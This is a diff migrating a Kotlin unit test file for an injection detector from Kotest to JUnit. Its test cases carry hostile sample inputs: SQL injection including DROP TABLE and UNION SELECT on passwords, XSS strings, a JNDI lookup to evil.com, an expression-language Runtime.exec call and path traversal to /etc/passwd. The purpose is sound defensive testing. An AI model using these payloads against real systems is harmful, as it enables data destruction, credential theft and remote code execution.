@@ -1,120 +1,134 @@
 package com.axians.eaf.framework.security
 
 import com.axians.eaf.framework.core.exceptions.EafException
-import io.kotest.assertions.throwables.shouldNotThrowAny
-import io.kotest.assertions.throwables.shouldThrow
-import io.kotest.core.spec.style.FunSpec
-import io.kotest.matchers.string.shouldContain
-import io.kotest.matchers.types.shouldBeInstanceOf
+import org.assertj.core.api.Assertions.assertThat
+import org.junit.jupiter.api.Test
+import org.junit.jupiter.api.assertDoesNotThrow
+import org.junit.jupiter.api.assertThrows
 
-class InjectionDetectorTest :
-    FunSpec({
+/**
+ * Unit tests for InjectionDetector.
+ *
+ * Migrated from Kotest to JUnit 6 on 2025-11-20
+ */
+class InjectionDetectorTest {
 
-        val detector = InjectionDetector()
+    private val detector = InjectionDetector()
 
-        context("SQL Injection Patterns") {
-            test("should detect SQL injection with --") {
-                val claims = mapOf("username" to "admin' --")
-                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
-                exception.claim shouldContain "username"
-                exception.detectedPattern shouldContain "--"
-            }
+    // SQL Injection Patterns
 
-            test("should detect SQL injection with ;") {
-                val claims = mapOf("username" to "admin'; DROP TABLE users;")
-                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
-                exception.claim shouldContain "username"
-                exception.detectedPattern shouldContain ";"
-            }
+    @Test
+    fun `should detect SQL injection with --`() {
+        val claims = mapOf("username" to "admin' --")
+        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
+        assertThat(exception.claim).contains("username")
+        assertThat(exception.detectedPattern).contains("--")
+    }
 
-            test("should detect SQL injection with UNION SELECT") {
-                val claims = mapOf("username" to "admin' UNION SELECT null, null, password FROM users--")
-                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
-                exception.claim shouldContain "username"
-                // Any SQL pattern match is sufficient
-            }
+    @Test
+    fun `should detect SQL injection with semicolon`() {
+        val claims = mapOf("username" to "admin'; DROP TABLE users;")
+        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
+        assertThat(exception.claim).contains("username")
+        assertThat(exception.detectedPattern).contains(";")
+    }
 
-            test("should not flag legitimate text like O'Malley") {
-                val claims = mapOf("name" to "O'Malley")
-                shouldNotThrowAny { detector.scan(claims) }
-            }
-        }
+    @Test
+    fun `should detect SQL injection with UNION SELECT`() {
+        val claims = mapOf("username" to "admin' UNION SELECT null, null, password FROM users--")
+        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
+        assertThat(exception.claim).contains("username")
+        // Any SQL pattern match is sufficient
+    }
 
-        context("XSS Patterns") {
-            test("should detect XSS with <script>") {
-                val claims = mapOf("comment" to "<script>alert(1)</script>")
-                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
-                exception.claim shouldContain "comment"
-                // Any XSS pattern match is sufficient
-            }
+    @Test
+    fun `should not flag legitimate text like O'Malley`() {
+        val claims = mapOf("name" to "O'Malley")
+        assertDoesNotThrow { detector.scan(claims) }
+    }
 
-            test("should detect XSS with javascript:") {
-                val claims = mapOf("url" to "javascript:alert(1)")
-                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
-                exception.claim shouldContain "url"
-                exception.detectedPattern shouldContain "javascript:"
-            }
-        }
+    // XSS Patterns
 
-        context("JNDI Injection Patterns") {
-            test("should detect JNDI injection with jndi:") {
-                val claims = mapOf("data" to "\${jndi:ldap://evil.com/a}")
-                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
-                exception.claim shouldContain "data"
-                // Any JNDI pattern match is sufficient
-            }
-        }
+    @Test
+    fun `should detect XSS with script tag`() {
+        val claims = mapOf("comment" to "<script>alert(1)</script>")
+        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
+        assertThat(exception.claim).contains("comment")
+        // Any XSS pattern match is sufficient
+    }
 
-        context("Expression Language injection with \${...}") {
-            test("should detect Expression Language injection with \${...}") {
-                val claims = mapOf("message" to "Hello \${T(java.lang.Runtime).getRuntime().exec('calc')}")
-                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
-                exception.claim shouldContain "message"
-                // Any expression injection pattern match is sufficient
-            }
-        }
+    @Test
+    fun `should detect XSS with javascript protocol`() {
+        val claims = mapOf("url" to "javascript:alert(1)")
+        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
+        assertThat(exception.claim).contains("url")
+        assertThat(exception.detectedPattern).contains("javascript:")
+    }
 
-        context("Path Traversal Patterns") {
-            test("should detect Path Traversal with ../") {
-                val claims = mapOf("path" to "../../etc/passwd")
-                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
-                exception.claim shouldContain "path"
-                // Any path traversal pattern match is sufficient
-            }
+    // JNDI Injection Patterns
 
-            test("should detect Path Traversal with ..\\") {
-                val claims = mapOf("path" to "..\\..\\windows\\win.ini")
-                val exception = shouldThrow<InjectionDetectedException> { detector.scan(claims) }
-                exception.claim shouldContain "path"
-                // Any path traversal pattern match is sufficient
-            }
-        }
+    @Test
+    fun `should detect JNDI injection with jndi`() {
+        val claims = mapOf("data" to "\${jndi:ldap://evil.com/a}")
+        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
+        assertThat(exception.claim).contains("data")
+        // Any JNDI pattern match is sufficient
+    }
 
-        context("Safe Claim Values") {
-            test("should not flag safe strings") {
-                val claims =
-                    mapOf(
-                        "username" to "john.doe",
-                        "email" to "john.doe@example.com",
-                        "description" to "This is a normal description.",
-                    )
-                shouldNotThrowAny { detector.scan(claims) }
-            }
+    // Expression Language injection with ${...}
 
-            test("should handle non-string claims gracefully") {
-                val claims =
-                    mapOf(
-                        "userId" to 123,
-                        "isAdmin" to true,
-                    )
-                shouldNotThrowAny { detector.scan(claims) }
-            }
-        }
+    @Test
+    fun `should detect Expression Language injection with dollar brace`() {
+        val claims = mapOf("message" to "Hello \${T(java.lang.Runtime).getRuntime().exec('calc')}")
+        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
+        assertThat(exception.claim).contains("message")
+        // Any expression injection pattern match is sufficient
+    }
 
-        context("InjectionDetectedException") {
-            test("should extend EafException") {
-                val exception = InjectionDetectedException("claim", "pattern", "value")
-                exception.shouldBeInstanceOf<EafException>()
-            }
-        }
-    })
+    // Path Traversal Patterns
+
+    @Test
+    fun `should detect Path Traversal with forward slashes`() {
+        val claims = mapOf("path" to "../../etc/passwd")
+        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
+        assertThat(exception.claim).contains("path")
+        // Any path traversal pattern match is sufficient
+    }
+
+    @Test
+    fun `should detect Path Traversal with backslashes`() {
+        val claims = mapOf("path" to "..\\..\\windows\\win.ini")
+        val exception = assertThrows<InjectionDetectedException> { detector.scan(claims) }
+        assertThat(exception.claim).contains("path")
+        // Any path traversal pattern match is sufficient
+    }
+
+    // Safe Claim Values
+
+    @Test
+    fun `should not flag safe strings`() {
+        val claims = mapOf(
+            "username" to "john.doe",
+            "email" to "john.doe@example.com",
+            "description" to "This is a normal description.",
+        )
+        assertDoesNotThrow { detector.scan(claims) }
+    }
+
+    @Test
+    fun `should handle non-string claims gracefully`() {
+        val claims = mapOf(
+            "userId" to 123,
+            "isAdmin" to true,
+        )
+        assertDoesNotThrow { detector.scan(claims) }
+    }
+
+    // InjectionDetectedException
+
+    @Test
+    fun `should extend EafException`() {
+        val exception = InjectionDetectedException("claim", "pattern", "value")
+        assertThat(exception).isInstanceOf(EafException::class.java)
+    }
+}
